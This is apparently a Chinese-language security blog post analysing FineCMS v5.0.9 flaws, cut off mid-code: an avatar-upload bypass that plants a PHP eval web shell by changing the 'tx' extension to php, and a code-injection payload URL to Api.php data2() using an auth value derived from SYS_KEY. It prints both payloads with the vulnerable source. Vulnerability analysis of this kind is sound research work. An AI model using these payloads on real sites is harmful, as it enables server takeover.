    <content type="html"><![CDATA[<p>FineCMS v5.0.9 任意文件上传&amp;代码执行&amp;SQL语句执行漏洞</p><a id="more"></a><h2 id="0x01-任意文件上传漏洞演示-amp-剖析"><a href="#0x01-任意文件上传漏洞演示-amp-剖析" class="headerlink" title="0x01 任意文件上传漏洞演示&amp;剖析"></a>0x01 任意文件上传漏洞演示&amp;剖析</h2><p>概述： 在FineCMS v5.0.9版本中，会员中心中的上传头像模块存在任意文件上传漏洞</p><h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>首先注册一个用户，进入到会员中心，上传一个名为”mengchen.jpeg”的图片马，文件内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo(); @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mengchen&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传时使用burpsuite抓包</p><p><img src="https://image.mengsec.com/fincms-5.0.9-2.png"></p><p>将tx参数中的jpeg改为php,直接提交</p><p><img src="https://image.mengsec.com/fincms-5.0.9-3.png"></p><p>这样文件就传上去了，而且还能执行</p><p><img src="https://image.mengsec.com/fincms-5.0.9-4.png"></p><h3 id="漏洞原理剖析"><a href="#漏洞原理剖析" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>头像上传的函数在/finecms/dayrui/member/controllers/Account.php中的第177-214行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs awk">public <span class="hljs-keyword">function</span> upload() &#123;<br><br>    <span class="hljs-regexp">//</span> 创建图片存储文件夹<br>    <span class="hljs-variable">$dir</span> = SYS_UPLOAD_PATH.<span class="hljs-string">&#x27;/member/&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;uid.<span class="hljs-string">&#x27;/&#x27;</span>;<br>    @dr_dir_delete(<span class="hljs-variable">$dir</span>);<br>    !is_dir(<span class="hljs-variable">$dir</span>) &amp;&amp; dr_mkdirs(<span class="hljs-variable">$dir</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tx&#x27;</span>]) &#123;<br>        <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tx&#x27;</span>]);<span class="hljs-regexp">//</span>将空格替换为+号<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="hljs-variable">$file</span>, <span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-variable">$new_file</span> = <span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;0x0.&#x27;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>            <span class="hljs-keyword">if</span> (!@file_put_contents(<span class="hljs-variable">$new_file</span>, base64_decode(str_replace(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file</span>)))) &#123;<br>                <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;目录权限不足或磁盘已满&#x27;</span>));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$this</span>-&gt;load-&gt;library(<span class="hljs-string">&#x27;image_lib&#x27;</span>);<br>                <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;create_thumb&#x27;</span>] = TRUE;<br>                <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;thumb_marker&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>                <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;maintain_ratio&#x27;</span>] = FALSE;<br>                <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;source_image&#x27;</span>] = <span class="hljs-variable">$new_file</span>;<br>                foreach (array(<span class="hljs-number">30</span>, <span class="hljs-number">45</span>, <span class="hljs-number">90</span>, <span class="hljs-number">180</span>) as <span class="hljs-variable">$a</span>) &#123;<br>                    <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;width&#x27;</span>] = <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;height&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>                    <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;new_image&#x27;</span>] = <span class="hljs-variable">$dir</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;x&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>                    <span class="hljs-variable">$this</span>-&gt;image_lib-&gt;initialize(<span class="hljs-variable">$config</span>);<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$this</span>-&gt;image_lib-&gt;resize()) &#123;<br>                        <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;上传错误：&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;image_lib-&gt;display_errors()));<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                list(<span class="hljs-variable">$width</span>, <span class="hljs-variable">$height</span>, <span class="hljs-variable">$type</span>, <span class="hljs-variable">$attr</span>) = getimagesize(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;45x45.&#x27;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>]);<br>                !<span class="hljs-variable">$type</span> &amp;&amp; <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;图片字符串不规范&#x27;</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;图片字符串不规范&#x27;</span>));<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;图片不存在&#x27;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure><p>问题主要出现在第186行的那一句正则上</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^(<span class="hljs-params">data</span>:\<span class="hljs-params">s</span><span class="hljs-operator">*</span><span class="hljs-params">image</span>\<span class="hljs-operator">/</span>(\<span class="hljs-params">w</span>+)</span>;base64,)/&#x27;, $file, $result))<br></code></pre></td></tr></table></figure><p>在这里主要匹配的类似于”data:image/php;base64,”这种字符串，以”data:”开头，中间有”image/“,结尾有”;base64,”，但是”image/“和”;base64,”之间的字符串只要是任意数字和字母即可。</p><p><img src="https://image.mengsec.com/fincms-5.0.9-1.png"></p><p>最严重的是，开发者在这里将(\w+)匹配到的字符串作为了传入文件的扩展名</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">第<span class="hljs-number">187</span>行 $new_file = $dir.<span class="hljs-string">&#x27;0x0.&#x27;</span>.$result[2]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后文件就直接保存到服务器中了，在这之间没有任何的过滤，可以看一下测试代码</p><p><img src="https://image.mengsec.com/fincms-5.0.9-5.png"></p><p><img src="https://image.mengsec.com/fincms-5.0.9-6.png"></p><p>至于路径中的uid，cookie中就有</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$dir</span> = SYS_UPLOAD_PATH.<span class="hljs-string">&#x27;/member/&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;uid.<span class="hljs-string">&#x27;/&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="0x02-代码执行漏洞演示-amp-剖析"><a href="#0x02-代码执行漏洞演示-amp-剖析" class="headerlink" title="0x02 代码执行漏洞演示&amp;剖析"></a>0x02 代码执行漏洞演示&amp;剖析</h2><h3 id="漏洞演示-1"><a href="#漏洞演示-1" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>先放上payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">index</span>.php?c=api&amp;m=data<span class="hljs-number">2</span>&amp;auth=<span class="hljs-number">50</span>ce<span class="hljs-number">0</span>d<span class="hljs-number">2401</span>ce<span class="hljs-number">4802751739552</span>c<span class="hljs-number">8</span>e<span class="hljs-number">4467</span>&amp;param=action=cache name=MEMBER.<span class="hljs-number">1</span>&#x27;];phpinfo();$a=[&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>执行效果</p><p><img src="https://image.mengsec.com/fincms-5.0.9-7.png"></p><h3 id="漏洞原理剖析-1"><a href="#漏洞原理剖析-1" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>这个漏洞在/finecms/dayrui/controllers/Api.php中的data2()函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">data2</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-comment">// 安全码认证</span><br>    <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">$this</span>-&gt;input-&gt;get(<span class="hljs-string">&#x27;auth&#x27;</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span> != md5(SYS_KEY)) &#123;<br>        <span class="hljs-comment">// 授权认证码不正确</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-string">&#x27;授权认证码不正确&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 解析数据</span><br>        <span class="hljs-variable">$cache</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$param</span> = <span class="hljs-keyword">$this</span>-&gt;input-&gt;get(<span class="hljs-string">&#x27;param&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]) &#123;<br>            <span class="hljs-variable">$cache</span> = md5(dr_array2string(<span class="hljs-variable">$param</span>));<br>            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;get_cache_data(<span class="hljs-variable">$cache</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$data</span>) &#123;<br><br>            <span class="hljs-comment">// list数据查询</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;template-&gt;list_tag(<span class="hljs-variable">$param</span>);<br>            <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;error&#x27;</span>] ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;sql&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;pages&#x27;</span>]);<br><br>            <span class="hljs-comment">// 缓存数据</span><br>            <span class="hljs-variable">$cache</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;set_cache_data(<span class="hljs-variable">$cache</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]);<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">// 接收参数</span><br><span class="hljs-variable">$format</span> = <span class="hljs-keyword">$this</span>-&gt;input-&gt;get(<span class="hljs-string">&#x27;format&#x27;</span>);<br><span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;input-&gt;get(<span class="hljs-string">&#x27;function&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$function</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-variable">$function</span>)) &#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; fc_lang(<span class="hljs-string">&#x27;自定义函数&#x27;</span>.<span class="hljs-variable">$function</span>.<span class="hljs-string">&#x27;不存在&#x27;</span>), <span class="hljs-string">&#x27;code&#x27;</span> =&gt; <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$function</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">// 页面输出</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$format</span> == <span class="hljs-string">&#x27;php&#x27;</span>) &#123;<br>print_r(<span class="hljs-variable">$data</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$format</span> == <span class="hljs-string">&#x27;jsonp&#x27;</span>) &#123;<br><span class="hljs-comment">// 自定义返回名称</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;input-&gt;get(<span class="hljs-string">&#x27;callback&#x27;</span>, <span class="hljs-literal">TRUE</span>).<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;callback_json(<span class="hljs-variable">$data</span>).<span class="hljs-string">&#x27;)&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 自定义返回名称</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;callback_json(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入函数后，首先是安全码认证，这个在网站内部，但是很容易获得，就是cookie的名字的开头到第一个”_”处</p><p><img src="https://image.mengsec.com/fincms-5.0.9-8.png"></p><p>安全密钥在/config/system.php中第11行被定义</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;SYS_KEY&#x27; =&gt; &#x27;24b16fede9a67c<span class="hljs-number">9251</span>d3e7c<span class="hljs-number">7161</span>c83ac&#x27;, <span class="hljs-comment">//安全密钥</span><br></code></pre></td></tr></table></figure><p>然后在/finecms/dayrui/config/config.php中第37行将其设置成为cookie的名字</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$co</span>nfig[<span class="hljs-string">&#x27;sess_cookie_name&#x27;</span>] = <span class="hljs-symbol">$site</span>[<span class="hljs-string">&#x27;SYS_KEY&#x27;</span>].<span class="hljs-string">&#x27;_ci_session&#x27;</span>;<br></code></pre></td></tr></table></figure><p>因此，直接在payload中使auth的值为SYS_KEY的MD5值即可。</p><p>传入的param值不满足128行的条件<br>​    </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$param</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;cache&#x27;</span>]</span>) &amp;&amp; <span class="hljs-variable">$param</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;cache&#x27;</span>]</span>)<br></code></pre></td></tr></table></figure><p>因此$data依旧为空，$param直接传入list_tag()函数中</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$this</span>-&gt;template-&gt;list_tag(<span class="hljs-variable">$param</span>);<br></code></pre></td></tr></table></figure><p>定位一下list_tag()，在/finecms/dayrui/libraries/Template.php第402行</p><p>传入的数据被处理成$params，一个数组</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Array( <br>[0] =&gt; <span class="hljs-attribute">action</span>=cache <br>[1] =&gt; <span class="hljs-attribute">name</span>=member.1&#x27;];phpinfo();<span class="hljs-variable">$a</span>=[<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">) </span><br></code></pre></td></tr></table></figure><p>然后经过遍历处理，将两个值分别给了$system[‘action’]和$param[‘name’]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$system</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;action&#x27;</span>]</span> = cache<br><span class="hljs-variable">$param</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;name&#x27;</span>]</span> = member.<span class="hljs-number">1</span><span class="hljs-string">&#x27;];phpinfo();$a=[&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后在switch-case中，进入了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;cache&#x27;</span>: <span class="hljs-comment">// 系统缓存数据</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&#x27;name参数不存在&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-string">&#x27;.&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">FALSE</span>) &#123;<br>    <span class="hljs-variable">$_name</span> = substr(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-number">0</span>, <span class="hljs-variable">$pos</span>);<br>    <span class="hljs-variable">$_param</span> = substr(<span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$pos</span> + <span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$_name</span> = <span class="hljs-variable">$param</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$_param</span> = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-variable">$cache</span> = <span class="hljs-keyword">$this</span>-&gt;_cache_var(<span class="hljs-variable">$_name</span>, !<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>] ? SITE_ID : <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$cache</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&quot;缓存(<span class="hljs-subst">&#123;$_name&#125;</span>)不存在，请在后台更新缓存&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_param</span>) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>();<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$data=$cache&#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;_get_var(<span class="hljs-variable">$_param</span>) . <span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$data</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&quot;缓存(<span class="hljs-subst">&#123;$_name&#125;</span>)参数不存在!!&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$cache</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>代码执行的地方呢在第510行</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-meta">@eval</span>(<span class="hljs-string">&#x27;<span class="hljs-subst">$data</span>=<span class="hljs-subst">$cache</span>&#x27;</span>.$<span class="hljs-keyword">this</span>-&gt;_get_var($_param).<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>要想将代码执行到这儿，必须使得503-506行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cache</span> = <span class="hljs-keyword">$this</span>-&gt;_cache_var(<span class="hljs-variable">$_name</span>, !<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>] ? SITE_ID : <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>]);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$cache</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&quot;缓存(<span class="hljs-subst">&#123;$_name&#125;</span>)不存在，请在后台更新缓存&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>的$cache有值，在这</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$_name</span> = member<br><span class="hljs-variable">$_param</span> = <span class="hljs-number">1</span><span class="hljs-string">&#x27;];phpinfo();<span class="hljs-variable">$a</span>=[&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>定位一下”_cache_var()”,在/finecms/dayrui/libraries/Template.php第1594-1619行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_cache_var</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$site</span> = SITE_ID</span>) </span>&#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$name</span> = strtoupper(<span class="hljs-variable">$name</span>);<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$name</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;MEMBER&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache(<span class="hljs-string">&#x27;member&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;URLRULE&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache(<span class="hljs-string">&#x27;urlrule&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;MODULE&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache(<span class="hljs-string">&#x27;module&#x27;</span>);<br>    <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;CATEGORY&#x27;</span>:<br>        <span class="hljs-variable">$site</span> = <span class="hljs-variable">$site</span> ? <span class="hljs-variable">$site</span> : SITE_ID;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache(<span class="hljs-string">&#x27;category-&#x27;</span> . <span class="hljs-variable">$site</span>);<br>    <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache(<span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-variable">$site</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着定位get_cache(),在/finecms/dayrui/core/M_Controller.php第362-402行。</p><p>在其中，把传入的$name来读取本地文件缓存数据。因此只有传入”_cache_var()”的$name为</p><pre><code>MEMBER、URLRULE、MODULE、CATEGORY</code></pre><p>中的任意一个才行，否则会引起报错。</p><p>执行到这儿,在Template.php中的$_param存在，代码执行到了</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-meta">@eval</span>(<span class="hljs-string">&#x27;<span class="hljs-subst">$data</span>=<span class="hljs-subst">$cache</span>&#x27;</span>.$<span class="hljs-keyword">this</span>-&gt;_get_var($_param).<span 